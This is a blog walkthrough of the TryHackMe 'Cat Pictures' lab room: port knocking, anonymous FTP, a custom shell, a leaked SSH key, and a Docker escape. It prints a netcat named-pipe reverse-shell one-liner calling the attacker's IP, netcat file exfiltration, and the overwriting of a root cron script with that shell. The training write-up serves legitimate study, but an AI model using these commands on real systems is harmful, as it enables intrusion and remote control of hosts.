---
title: "Walk-through of Cat Pictures from TryHackMe"
header:
  teaser: /assets/images/2021-06-07-21-31-17.png
toc: true
toc_sticky: true
excerpt_separator:  <!--more-->
categories:
  - CTF
tags:
  - THM
  - CTF
  - Linux
  - 
---

## Machine Information

![catpics](/assets/images/2021-06-07-21-31-17.png)

Cat Pictures is an easy difficulty room on TryHackMe. Our initial scan reveals several open and filtered ports. We find phpBB running on one of them, from there we find clues to a port knocking sequence which opens an anonymous FTP service. We find credentials to access a custom shell running on another port, which leads us to a password protected executable. A hexdump reveals a password, and the output is a private RSA key. We use this to access a docker container via SSH. From there we escape to the underlying host to gain our final flag. As you can see this one is quite a fun ride!

<!--more-->

Skills required are basic file and operating system enumeration and exploration knowledge. Skills gained are methods of port knocking and escaping shells and containers.

| Details |  |
| --- | --- |
| Hosting Site | [TryHackMe](https://tryhackme.com/) |
| Link To Machine | [THM - Easy - Cat Pictures](https://tryhackme.com/room/catpictures) |
| Machine Release Date | 24th March 2021 |
| Date I Completed It | 6th June 2021 |
| Distribution Used | Kali 2021.1 – [Release Info](https://www.kali.org/blog/kali-linux-2021-1-release) |

## Initial Recon

As always let's start with Nmap:

```text
┌──(root💀kali)-[~/thm/catpics]
└─# ports=$(nmap -p- --min-rate=1000 -T4 10.10.158.78 | grep ^[0-9] | cut -d '/' -f 1 | tr '\n' ',' | sed s/,$//)

┌──(root💀kali)-[~/thm/catpics]
└─# nmap -p$ports -sC -sV -oA catpics 10.10.158.78                                                               
Starting Nmap 7.91 ( https://nmap.org ) at 2021-06-06 17:36 BST
Nmap scan report for catpics.thm (10.10.158.78)
Host is up (0.028s latency).

PORT     STATE    SERVICE      VERSION
21/tcp   filtered ftp
22/tcp   open     ssh          OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 37:43:64:80:d3:5a:74:62:81:b7:80:6b:1a:23:d8:4a (RSA)
|   256 53:c6:82:ef:d2:77:33:ef:c1:3d:9c:15:13:54:0e:b2 (ECDSA)
|_  256 ba:97:c3:23:d4:f2:cc:08:2c:e1:2b:30:06:18:95:41 (ED25519)
2375/tcp filtered docker
4420/tcp open     nvm-express?
| fingerprint-strings: 
|   DNSVersionBindReqTCP, GenericLines, GetRequest, HTTPOptions, RTSPRequest: 
|     INTERNAL SHELL SERVICE
|     please note: cd commands do not work at the moment, the developers are fixing it at the moment.
|     ctrl-c
|     Please enter password:
|     Invalid password...
|     Connection Closed
|   NULL, RPCCheck: 
|     INTERNAL SHELL SERVICE
|     please note: cd commands do not work at the moment, the developers are fixing it at the moment.
|     ctrl-c
|_    Please enter password:
8080/tcp open     http         Apache httpd 2.4.46 ((Unix) OpenSSL/1.1.1d PHP/7.3.27)
| http-open-proxy: Potentially OPEN proxy.
|_Methods supported:CONNECTION
|_http-server-header: Apache/2.4.46 (Unix) OpenSSL/1.1.1d PHP/7.3.27

Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 95.02 seconds
```

Our initial scan reveals several ports. We can see FTP on port 21 is being filtered by a firewall, as is docker on port 2375. We have SSH on port 22 and Apache running on port 8080. There's also something on port 4420, the fingerprint of the service suggests it's some sort of internal shell.

First let's add the server IP to our hosts file:

```text
┌──(root💀kali)-[~/thm/internal]
└─# echo 10.10.158.78 catpics.thm >> /etc/hosts
```

## phpBB

We'll start with port 8080 and see if there is a website to look around:

![catpics-phpbb](/assets/images/2021-06-06-17-44-22.png)

We find a bulletin board set up for us to share our cat pictures. Nice!

Disappointingly when we look around we find there is only one post:

![catpics-post](/assets/images/2021-06-06-17-45-29.png)

This is a clear clue that we need to use port knocking to progress. I've covered this before on the [HTB Machine Nineveh](https://pencer.io/ctf/ctf-htb-nineveh), there's also a good detailed article [here](https://www.howtogeek.com/442733/how-to-use-port-knocking-on-linux-and-why-you-shouldnt) that explains how to set up your own knockd service and access it.

## Port Knocking

If we look back at our earlier scan we found two ports, 21 and 2375, that were filtered. It's a good bet that one or both will be opened by knocking. Let's get to it, first using the same method as I did on Nineveh using nmap:

```text
┌──(root💀kali)-[~/thm/catpics]
└─# for x in <HIDDEN>; do nmap -Pn --host-timeout 201 --max-retries 0 -p $x catpics.thm; done
Host discovery disabled (-Pn). All addresses will be marked 'up' and scan times will be slower.
Starting Nmap 7.91 ( https://nmap.org ) at 2021-06-06 18:03 BST
Nmap scan report for catpics.thm (10.10.158.78)
Host is up (0.029s latency).

PORT     STATE  SERVICE
<HIDDEN>/tcp closed lmsocialserver
Nmap done: 1 IP address (1 host up) scanned in 0.15 seconds
Host discovery disabled (-Pn). All addresses will be marked 'up' and scan times will be slower.
Starting Nmap 7.91 ( https://nmap.org ) at 2021-06-06 18:03 BST
Nmap scan report for catpics.thm (10.10.158.78)
Host is up (0.036s latency).

PORT     STATE  SERVICE
<HIDDEN>/tcp closed EtherNetIP-1
Nmap done: 1 IP address (1 host up) scanned in 0.16 seconds
Host discovery disabled (-Pn). All addresses will be marked 'up' and scan times will be slower.
Starting Nmap 7.91 ( https://nmap.org ) at 2021-06-06 18:03 BST
Nmap scan report for catpics.thm (10.10.158.78)
Host is up (0.025s latency).

PORT     STATE  SERVICE
<HIDDEN>/tcp closed dec-notes
Nmap done: 1 IP address (1 host up) scanned in 0.15 seconds
Host discovery disabled (-Pn). All addresses will be marked 'up' and scan times will be slower.
Starting Nmap 7.91 ( https://nmap.org ) at 2021-06-06 18:03 BST
Nmap scan report for catpics.thm (10.10.158.78)
Host is up (0.023s latency).

PORT     STATE  SERVICE
<HIDDEN>/tcp closed krb524

Nmap done: 1 IP address (1 host up) scanned in 0.15 seconds
```

We could also install the knockd tools, which includes knock which we use instead:

```text
┌──(root💀kali)-[~/thm/catpics]
└─# knock                                                                        
Command 'knock' not found, but can be installed with:
apt install knockd
Do you want to install it? (N/y)y
apt install knockd
Reading package lists... Done
Building dependency tree... Done
Reading state information... Done
The following NEW packages will be installed:
  knockd
0 upgraded, 1 newly installed, 0 to remove and 47 not upgraded.
Need to get 25.8 kB of archives.
After this operation, 104 kB of additional disk space will be used.
Get:1 http://kali.download/kali kali-rolling/main amd64 knockd amd64 0.7-1+b1 [25.8 kB]
Fetched 25.8 kB in 1s (28.7 kB/s) 
Selecting previously unselected package knockd.
(Reading database ... 301016 files and directories currently installed.)
Preparing to unpack .../knockd_0.7-1+b1_amd64.deb ...
Unpacking knockd (0.7-1+b1) ...
Setting up knockd (0.7-1+b1) ...
update-rc.d: We have no instructions for the knockd init script.
update-rc.d: It looks like a network service, we disable it.
Processing triggers for man-db (2.9.4-2) ...
Processing triggers for kali-menu (2021.2.3) ...

┌──(root💀kali)-[~/thm/catpics]
└─# knock catpics.thm -v -d 100 <HIDDEN>
hitting tcp 10.10.158.78:<HIDDEN>
hitting tcp 10.10.158.78:<HIDDEN>
hitting tcp 10.10.158.78:<HIDDEN>
hitting tcp 10.10.158.78:<HIDDEN>
```

Either way once we've knocked, let's do another port scan and see if anything changed:

```text
┌──(root💀kali)-[~/thm/catpics]
└─# nmap -p$ports -sC -sV -oA catpics 10.10.158.78                                                       
Starting Nmap 7.91 ( https://nmap.org ) at 2021-06-06 18:03 BST
Nmap scan report for catpics.thm (10.10.158.78)
Host is up (0.025s latency).

PORT     STATE    SERVICE      VERSION
21/tcp   open     ftp          vsftpd 3.0.3
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
|_-rw-r--r--    1 ftp      ftp           162 Apr 02 14:32 note.txt
| ftp-syst: 
|   STAT: 
| FTP server status:
|      Connected to ::ffff:10.8.165.116
|      Logged in as ftp
|      TYPE: ASCII
|      No session bandwidth limit
|      Session timeout in seconds is 300
|      Control connection is plain text
|      Data connections will be plain text
|      At session startup, client count was 2
|      vsFTPd 3.0.3 - secure, fast, stable
|_End of status
<SNIP>
```

## Anonymous FTP

We now see port 21 hosting FTP has opened, and there is anonymous logins allowed. Let's go look at the file the scan found:

```text
┌──(root💀kali)-[~/thm/catpics]
└─# ftp catpics.thm
Connected to catpics.thm.
220 (vsFTPd 3.0.3)
Name (catpics.thm:kali): anonymous
230 Login successful.
Remote system type is UNIX.
Using binary mode to transfer files.

ftp> ls
200 PORT command successful. Consider using PASV.
150 Here comes the directory listing.
-rw-r--r--    1 ftp      ftp           162 Apr 02 14:32 note.txt
226 Directory send OK.

ftp> get note.txt /dev/tty
local: /dev/tty remote: note.txt
200 PORT command successful. Consider using PASV.
150 Opening BINARY mode data connection for note.txt (162 bytes).
In case I forget my password, I'm leaving a pointer to the internal shell service on the server.

Connect to port 4420, the password is <HIDDEN>.
- catlover
226 Transfer complete.
162 bytes received in 0.00 secs (1.5000 MB/s)
```

## Internal Shell

We've found credentials for the service we saw earlier running on port 4420. Let's give it a go:

```text
┌──(root💀kali)-[~/thm/catpics]
└─# nc -v catpics.thm 4420
catpics.thm [10.10.158.78] 4420 (?) open
INTERNAL SHELL SERVICE
please note: cd commands do not work at the moment, the developers are fixing it at the moment.
do not use ctrl-c
Please enter password:
<HIDDEN>
Password accepted
```

That worked and we're in the server but with a limited shell. A quick look around shows there is very little exposed to us, I do find this though:

```text
ls -l home
drwxr-xr-x 2 0 0 4096 Apr  3 01:34 catlover

ls -l home/catlover
-rwxr-xr-x 1 0 0 18856 Apr  3 01:35 runme
```

However trying to run it give us this message:

```text
home/catlover/runme
THIS EXECUTABLE DOES NOT WORK UNDER THE INTERNAL SHELL, YOU NEED A REGULAR SHELL.
```

Time to upgrade to a better shell. One that I use often is from [pentestmonkey](http://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet):

```text
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.0.0.1 1234 >/tmp/f
```

This one seems to be pretty reliable. Let's check we have the needed commands:

```text
ls -l
drwxrwxr-x 2 1001 1001 4096 Apr  2 23:05 bin
drwxr-xr-x 2    0    0 4096 Apr  1 20:32 etc
drwxr-xr-x 3    0    0 4096 Apr  2 20:51 home
drwxr-xr-x 3    0    0 4096 Apr  2 22:53 lib
drwxr-xr-x 2    0    0 4096 Apr  1 20:28 lib64
drwxr-xr-x 2    0    0 4096 Apr  2 20:56 opt
drwxr-xr-x 2    0    0 4096 Apr  3 01:35 tmp
drwxr-xr-x 4    0    0 4096 Apr  2 22:43 usr

ls -l bin
-rwxr-xr-x 1 1001 1001 1113504 Apr  1 20:32 bash
-rwxr-xr-x 1    0    0   35064 Apr  1 20:32 cat
-rwxr-xr-x 1    0    0   35000 Apr  1 20:32 echo
-rwxr-xr-x 1    0    0  133792 Apr  1 20:32 ls
-rwxr-xr-x 1    0    0   35312 Apr  2 23:05 nc
-rwxr-xr-x 1    0    0   63704 Apr  1 20:32 rm
-rwxr-xr-x 1    0    0  121432 Apr  1 20:37 sh

ls -l usr
drwxr-xr-x 2 0 0 4096 Apr  3 01:31 bin
drwxr-xr-x 2 0 0 4096 Apr  2 22:53 lib

ls -l usr/bin
-rwxr-xr-x 1 0 0  63672 Apr  3 01:20 mkfifo
-rwxr-xr-x 1 0 0  88280 Apr  3 01:31 touch
-rwxr-xr-x 1 0 0 499264 Apr  2 22:43 wget
```

Having looked we can see all the needed commands are there, let's give it a go:

```text
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.8.165.116 1234 >/tmp/f
```

Switch to a waiting netcat session to see we have caught the shell:

```text
┌──(root💀kali)-[~/thm/catpics]
└─# nc -nlvp 1234       
listening on [any] 1234 ...
connect to [10.8.165.116] from (UNKNOWN) [10.10.91.88] 59310
/bin/sh: 0: can't access tty; job control turned off
#
```

## Custom Executable

Ok, let's try the executable again:

```text
# cd /home/catlover
# ls -l
-rwxr-xr-x 1 0 0 18856 Apr  3 01:35 runme
# ./runme
Please enter yout password: 12345
Access Denied
```

So we can run the executable, but still need to find a password. The next logical step here is to copy the file to my Kali machine and analyse it.  

On Kali we start a new netcat session listening on a spare port and tell it to redirect what is sent to it to a file:

```text
┌──(root💀kali)-[~/thm/catpics]
└─# nc -nlvp 443 > runme
listening on [any] 443 ...
```

Now back on the server we send the file to Kali by redirecting it using netcat that is on there:

```text
# nc 10.8.165.116 443 < home/catlover/runme
```

Switch back to Kali, ctrl-c to close the session and we will have the file:

```text
┌──(root💀kali)-[~/thm/catpics]
└─# nc -nlvp 443 > runme
listening on [any] 443 ...
connect to [10.8.165.116] from (UNKNOWN) [10.10.91.88] 38002
^C

┌──(root💀kali)-[~/thm/catpics]
└─# ls -l
-rw-r--r-- 1 root root 18856 Jun  6 22:10 runme

┌──(root💀kali)-[~/thm/catpics]
└─# chmod +x runme

┌──(root💀kali)-[~/thm/catpics]
└─# ./runme                                                          
Please enter yout password: 12345
Access Denied
```

## Hexdump

Ok, we have the file and can confirm it runs. Now we need to analyse it, and there are many different ways to achieve this on Linux. I used hexdump and grep to look for the word **password** as we know from the output when we run it that the word exists:

```text
┌──(root💀kali)-[~/thm/catpics]
└─# hexdump -C runme | grep -B 5 -A 5 password
00001650  48 83 c4 08 c3 00 00 00  00 00 00 00 00 00 00 00  |H...............|
00001660  00 00 00 00 00 00 00 00  00 00 00 00 00 00 00 00  |................|
*
00002000  01 00 02 00 00 00 00 00  00 72 65 62 65 63 63 61  |.........<HIDDEN>|
00002010  00 50 6c 65 61 73 65 20  65 6e 74 65 72 20 79 6f  |.Please enter yo|
00002020  75 74 20 70 61 73 73 77  6f 72 64 3a 20 00 00 00  |ut password: ...|
00002030  57 65 6c 63 6f 6d 65 2c  20 63 61 74 6c 6f 76 65  |Welcome, catlove|
00002040  72 21 20 53 53 48 20 6b  65 79 20 74 72 61 6e 73  |r! SSH key trans|
00002050  66 65 72 20 71 75 65 75  65 64 21 20 00 74 6f 75  |fer queued! .tou|
00002060  63 68 20 2f 74 6d 70 2f  67 69 62 6d 65 74 68 65  |ch /tmp/gibmethe|
00002070  73 73 68 6b 65 79 00 41  63 63 65 73 73 20 44 65  |sshkey.Access De|
```

## Strings

We could also use strings for a similar result:

```text
┌──(root💀kali)-[~/thm/catpics]
└─# strings runme | grep -B5 -A5 password  
u+UH
ATSH
[A\]
[]A\A]A^A_
<HIDDEN>
Please enter yout password: 
Welcome, catlover! SSH key transfer queued! 
touch /tmp/gibmethesshkey
Access Denied
:*3$"
zPLR
```

Either way we have a suspected password so let's try it:

```text
┌──(root💀kali)-[~/thm/catpics]
└─# ./runme
Please enter yout password: <HIDDEN>
Welcome, catlover! SSH key transfer queued!
```

We find a file created in our tmp folder:

```text
┌──(root💀kali)-[~/thm/catpics]
└─# ls -lsa /tmp/gibmethesshkey 
0 -rw-r--r-- 1 root root 0 Jun  6 22:19 /tmp/gibmethesshkey
```

It's 0 bytes, so doesn't reveal anything. Let's try it on the server now we have the password:

```text
# ./runme
Please enter yout password: <HIDDEN>
Welcome, catlover! SSH key transfer queued! 

# ls -l
total 24
-rw-r--r-- 1 0 0  1675 Jun  6 21:28 id_rsa
-rwxr-xr-x 1 0 0 18856 Apr  3 01:35 runme
```

We now have an id_rsa file containing a private key for catlover:

```text
# cat id_rsa
-----BEGIN RSA PRIVATE KEY-----
MIIEogIBAAKCAQEAmI1dCzfMF4y+TG3QcyaN3B7pLVMzPqQ1fSQ2J9jKzYxWArW5
IWnCNvY8gOZdOSWgDODCj8mOssL7SIIgkOuD1OzM0cMBSCCwYlaN9F8zmz6UJX+k
jSmQqh7eqtXuAvOkadRoFlyog2kZ1Gb72zebR75UCBzCKv1zODRx2zLgFyGu0k2u
xCa4zmBdm80X0gKbk5MTgM4/l8U3DFZgSg45v+2uM3aoqbhSNu/nXRNFyR/Wb10H
tzeTEJeqIrjbAwcOZzPhISo6fuUVNH0pLQOf/9B1ojI3/jhJ+zE6MB0m77iE07cr
lT5PuxlcjbItlEF9tjqudycnFRlGAKG6uU8/8wIDAQABAoIBAH1NyDo5p6tEUN8o
<HIDDEN>
RpHhAoGAehljGmhge+i0EPtcok8zJe+qpcV2SkLRi7kJZ2LaR97QAmCCsH5SndzR
tDjVbkh5BX0cYtxDnfAF3ErDU15jP8+27pEO5xQNYExxf1y7kxB6Mh9JYJlq0aDt
O4fvFElowV6MXVEMY/04fdnSWavh0D+IkyGRcY5myFHyhWvmFcQ=
-----END RSA PRIVATE KEY-----
```

## SSH Access

Copying this and pasting to a file on Kali let's us use it to log in to the server via SSH on port 22:

```text
┌──(root💀kali)-[~/thm/catpics]
└─# chmod 600 id_rsa

┌──(root💀kali)-[~/thm/catpics]
└─# ssh catlover@catpics.thm -i id_rsa                            
The authenticity of host 'catpics.thm (10.10.161.99)' can't be established.
ECDSA key fingerprint is SHA256:7HBac/JH7EKQik9kL1l9GMjCgLN/69gfXalu5cbPi4U.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added 'catpics.thm,10.10.161.99' (ECDSA) to the list of known hosts.

Welcome to Ubuntu 18.04.5 LTS (GNU/Linux 4.15.0-142-generic x86_64)

Last login: Fri Jun  4 14:40:35 2021
root@7546fa2336d6:/#
```

We're in, and looks like the root user:

```text
root@7546fa2336d6:/# id
uid=0(root) gid=0(root) groups=0(root)
```

We can grab the first flag:

```text
root@7546fa2336d6:/# ls /root
flag.txt
root@7546fa2336d6:/# cat /root/flag.txt 
<HIDDEN>
```

## Escaping Container

However looking around it's clear we are not actually root on the server, but instead we are inside a Docker container. [This](https://stackoverflow.com/questions/20010199/how-to-determine-if-a-process-runs-inside-lxc-docker#:~:text=The%20most%20reliable%20way%20is,name%20of%20the%20anchor%20point.) article has a few useful ways to check this, I used one here:

```text
root@7546fa2336d6:/opt/clean# grep 'docker\|lxc' /proc/1/cgroup
12:perf_event:/docker/7546fa2336d6ff6152d8fdfcb86b65ba4ef8dddd5dd199df560fdc391406f94a
11:hugetlb:/docker/7546fa2336d6ff6152d8fdfcb86b65ba4ef8dddd5dd199df560fdc391406f94a
10:cpu,cpuacct:/docker/7546fa2336d6ff6152d8fdfcb86b65ba4ef8dddd5dd199df560fdc391406f94a
8:devices:/docker/7546fa2336d6ff6152d8fdfcb86b65ba4ef8dddd5dd199df560fdc391406f94a
7:cpuset:/docker/7546fa2336d6ff6152d8fdfcb86b65ba4ef8dddd5dd199df560fdc391406f94a
6:net_cls,net_prio:/docker/7546fa2336d6ff6152d8fdfcb86b65ba4ef8dddd5dd199df560fdc391406f94a
5:memory:/docker/7546fa2336d6ff6152d8fdfcb86b65ba4ef8dddd5dd199df560fdc391406f94a
4:freezer:/docker/7546fa2336d6ff6152d8fdfcb86b65ba4ef8dddd5dd199df560fdc391406f94a
3:pids:/docker/7546fa2336d6ff6152d8fdfcb86b65ba4ef8dddd5dd199df560fdc391406f94a
2:blkio:/docker/7546fa2336d6ff6152d8fdfcb86b65ba4ef8dddd5dd199df560fdc391406f94a
1:name=systemd:/docker/7546fa2336d6ff6152d8fdfcb86b65ba4ef8dddd5dd199df560fdc391406f94a
```

So we still need to find the final flag, and to achieve that we need to escape the container. After looking around more I notice something interesting:

```text
root@7546fa2336d6:/# mount
<SNIP>
/dev/xvda1 on /bitnami/phpbb type ext4 (rw,relatime,errors=remount-ro,data=ordered)
/dev/xvda1 on /opt/clean type ext4 (rw,relatime,errors=remount-ro,data=ordered)
/dev/xvda1 on /etc/resolv.conf type ext4 (rw,relatime,errors=remount-ro,data=ordered)
/dev/xvda1 on /etc/hostname type ext4 (rw,relatime,errors=remount-ro,data=ordered)
/dev/xvda1 on /etc/hosts type ext4 (rw,relatime,errors=remount-ro,data=ordered)
```

What is this xvda1 partition? DF also shows us it is mounted on /opt/clean:

```text
root@7546fa2336d6:/# df
Filesystem     1K-blocks    Used Available Use% Mounted on
overlay         20509264 7607468  11836940  40% /
tmpfs              65536       0     65536   0% /dev
tmpfs             243280       0    243280   0% /sys/fs/cgroup
shm                65536       0     65536   0% /dev/shm
/dev/xvda1      20509264 7607468  11836940  40% /opt/clean
tmpfs             243280       0    243280   0% /proc/acpi
tmpfs             243280       0    243280   0% /proc/scsi
tmpfs             243280       0    243280   0% /sys/firmware
```

When we look in that folder we find just one file:

```text
root@7546fa2336d6:/# cd /opt/clean

root@7546fa2336d6:/opt/clean# ls -lsa
4 drwxr-xr-x 2 root root 4096 May  1 00:20 .
8 drwxrwxr-x 1 root root 4096 Mar 25 16:08 ..
4 -rw-r--r-- 1 root root   27 May  1 00:20 clean.sh

root@7546fa2336d6:/opt/clean# cat clean.sh 
#!/bin/bash
rm -rf /tmp/*
```

So we have a batch file that is clearing out anything in the /tmp folder. As that file is running from the mount point, then we can assume it is the host systems /tmp folder, not the one here in the container. To test this we can create a file in /tmp and see if it is deleted:

```text
root@7546fa2336d6:/opt/clean# touch /tmp/pencer

root@7546fa2336d6:/opt/clean# ls -l /tmp
-rw-r--r-- 1 root root 0 Jun  6 21:56 pencer

root@7546fa2336d6:/opt/clean# date
Sun Jun  6 21:56:24 UTC 2021

root@7546fa2336d6:/opt/clean# date
Sun Jun  6 22:02:09 UTC 2021

root@7546fa2336d6:/opt/clean# ls -l /tmp
total 0
-rw-r--r-- 1 root root 0 Jun  6 21:56 pencer
```

My file is still there, which to me suggests either there is no cronjob running on the host, or the /tmp it is cleaning is not the one local to me.

We have write permissions to the file so why not try changing it to firing a reverse shell at us? I know the one I used earlier worked, so let's use the same again but with a different port:

```text
root@7546fa2336d6:/opt/clean# echo "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.8.165.116 4444 >/tmp/f" > /opt/clean/clean.sh
```

Now we wait, and eventually I get a connection to my new netcat listener:

```text
┌──(root💀kali)-[~/thm/catpics]
└─# nc -nlvp 4444  
listening on [any] 4444 ...
connect to [10.8.165.116] from (UNKNOWN) [10.10.161.99] 53580
/bin/sh: 0: can't access tty; job control turned off
# id
uid=0(root) gid=0(root) groups=0(root)

# hostname
cat-pictures
```

I'm root, this time on the host server. Let's grab the flag:

```text
# ls /root
firewall
root.txt

# cat /root/root.txt
Congrats!!!
Here is your flag:
<HIDDEN>
```

## Root+1

I'm curious about that clean script, so just to scratch that itch let's check the crontab on the server:

```text
# cat /etc/crontab
# /etc/crontab: system-wide crontab
# Unlike any other crontab you don't have to run the `crontab'
# command to install the new version when you edit this file
# and files in /etc/cron.d. These files also have username fields,
# that none of the other crontabs do.

SHELL=/bin/sh
PATH=/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin

# m h dom mon dow user  command
17 *    * * *   root    cd / && run-parts --report /etc/cron.hourly
25 6    * * *   root    test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.daily )
47 6    * * 7   root    test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.weekly )
52 6    1 * *   root    test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.monthly )
#
*/2 * * * * root /bin/bash /opt/clean/clean.sh >/dev/null 2>&1
* * * * * root /bin/sleep 20; /usr/bin/python3 /opt/sshkeyfetcher/fetch.py >/dev/null 2>&1
```

As expected there is a cronjob that runs the clean.sh script every 2 minutes. [This](https://crontab.guru/every-2-minutes) is a good site if you need help deciphering cron schedules.

I hope you enjoyed this easy machine. And thanks to [gamercat](https://tryhackme.com/p/gamercat) and [TryHackMe](https://tryhackme.com/) for providing this free to the community.

For now we are all done. See you next time.
